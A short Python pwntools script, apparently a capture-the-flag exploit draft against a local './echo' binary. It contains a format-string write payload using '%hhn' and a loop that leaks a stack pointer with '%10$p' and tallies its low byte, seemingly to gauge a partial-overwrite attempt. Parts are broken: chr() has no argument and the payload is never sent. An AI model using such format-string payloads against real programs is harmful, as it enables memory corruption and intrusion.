from pwn import *


'%112x%10$hhn %11$p '.ljust(0x21, chr())

dik = {}


while(True):
	r = process('./echo')
	r.sendline('%10$p')
	lb = int(r.recvline(), 16) % 0x100
	dik[hex(lb)] = dik.get(hex(lb), 0) + 1
	r.close()
	print dik